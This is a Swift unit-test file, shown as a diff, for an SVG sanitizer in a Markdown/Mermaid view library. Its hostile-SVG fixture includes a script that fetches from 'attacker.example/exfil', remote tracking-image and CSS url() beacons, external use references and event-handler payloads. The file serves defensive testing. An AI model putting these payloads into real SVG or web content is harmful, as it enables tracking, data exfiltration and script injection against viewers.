@@ -1,0 +1,109 @@
+// SVGSanitizerTests.swift
+// MarkdownExtendedView
+//
+// Copyright 2025 Christian C. Berclaz
+//
+// Licensed under the Apache License, Version 2.0 (the "License");
+// you may not use this file except in compliance with the License.
+// You may obtain a copy of the License at
+//
+//     http://www.apache.org/licenses/LICENSE-2.0
+//
+// Unless required by applicable law or agreed to in writing, software
+// distributed under the License is distributed on an "AS IS" BASIS,
+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+// See the License for the specific language governing permissions and
+// limitations under the License.
+
+import XCTest
+
+@testable import MarkdownExtendedViewMermaidNative
+
+/// Phase 7 / Task 10 egress sanitizer gate (PRD §4.7a / §5.2 / T5/T11;
+/// CWE-20/79/918). The vector path must neutralize every non-`data:` external
+/// reference, `<script>`, and event handler before the SVG reaches SVGView.
+final class SVGSanitizerTests: XCTestCase {
+
+    /// One crafted diagram carrying ALL attack vectors at once (PRD T11):
+    /// `<image href=https>` + `<image xlink:href=https>` (both attr forms) +
+    /// external `<use xlink:href=https…#id>` + CSS `url(https…)` in a `style`
+    /// attr AND in a `<style>` block + `<script>` + `onclick`.
+    private let hostileSVG = """
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 50">
+      <style>.bg { fill: url(https://attacker.example/tracker.svg#g); }</style>
+      <script>fetch('https://attacker.example/exfil')</script>
+      <image href="https://attacker.example/beacon1.png" width="10" height="10"/>
+      <image xlink:href="https://attacker.example/beacon2.png" width="10" height="10"/>
+      <use xlink:href="https://attacker.example/sprite.svg#icon"/>
+      <rect width="100" height="50" onclick="alert(1)" style="fill: url(https://attacker.example/x.png)"/>
+      <image href="data:image/png;base64,AAAA" width="10" height="10"/>
+      <use xlink:href="#localGradient"/>
+    </svg>
+    """
+
+    func testHostileSVGHasNoSurvivingExternalReference() {
+        let out = SVGSanitizer.sanitize(hostileSVG)
+
+        // Every injected vector used this host — none may survive. (The `xmlns`
+        // namespace URIs are identifiers, not fetchable resources, and are
+        // correctly left intact, so we assert on the exfil host, not on bare
+        // "http://", which would false-positive on `xmlns="http://www.w3.org…"`.)
+        XCTAssertFalse(out.contains("attacker.example"), "external host leaked: \(out)")
+
+        // No script, no event handler.
+        XCTAssertFalse(out.lowercased().contains("<script"))
+        XCTAssertFalse(out.lowercased().contains("onclick"))
+
+        // No non-data url() token survives.
+        XCTAssertFalse(out.lowercased().contains("url(http"))
+    }
+
+    func testDataImageAndLocalFragmentSurvive() {
+        let out = SVGSanitizer.sanitize(hostileSVG)
+        // Legitimate, egress-free references must be preserved.
+        XCTAssertTrue(out.contains("data:image/png;base64,AAAA"), "data: image was dropped")
+        XCTAssertTrue(out.contains("#localGradient"), "local fragment <use> was dropped")
+    }
+
+    func testScriptWithAttributesAndSelfClosingRemoved() {
+        let svg = #"<svg><script type="text/javascript">x()</script><script src="https://e/x.js"/></svg>"#
+        let out = SVGSanitizer.sanitize(svg)
+        XCTAssertFalse(out.lowercased().contains("<script"))
+        XCTAssertFalse(out.contains("https://e/x.js"))
+    }
+
+    func testNonDataImageHrefNeutralizedBothAttributeForms() {
+        let svg = #"<svg><image href="http://e/a.png"/><image xlink:href="//e/b.png"/></svg>"#
+        let out = SVGSanitizer.sanitize(svg)
+        XCTAssertFalse(out.contains("e/a.png"))
+        XCTAssertFalse(out.contains("e/b.png"))
+    }
+
+    func testExternalUseNeutralizedLocalUseKept() {
+        let svg = ##"<svg><use href="https://e/s.svg#i"/><use xlink:href="#keep"/></svg>"##
+        let out = SVGSanitizer.sanitize(svg)
+        XCTAssertFalse(out.contains("e/s.svg"))
+        XCTAssertTrue(out.contains("#keep"))
+    }
+
+    func testEventHandlersStrippedAcrossQuotingStyles() {
+        let svg = #"<svg><rect onload='a()' onClick="b()" ONMOUSEOVER="c()"/></svg>"#
+        let out = SVGSanitizer.sanitize(svg)
+        XCTAssertFalse(out.lowercased().contains("onload"))
+        XCTAssertFalse(out.lowercased().contains("onclick"))
+        XCTAssertFalse(out.lowercased().contains("onmouseover"))
+    }
+
+    func testCleanSVGPassesThroughUnchangedInSubstance() {
+        // A benign mmdr-style SVG must keep its geometry and data: image.
+        let svg = """
+        <svg viewBox="0 0 200 100"><rect width="200" height="100" fill="#fff"/>\
+        <image href="data:image/png;base64,QQ==" width="20" height="20"/>\
+        <text x="5" y="20">A--&gt;B</text></svg>
+        """
+        let out = SVGSanitizer.sanitize(svg)
+        XCTAssertTrue(out.contains("viewBox=\"0 0 200 100\""))
+        XCTAssertTrue(out.contains("data:image/png;base64,QQ=="))
+        XCTAssertTrue(out.contains("A--&gt;B"))
+    }
+}
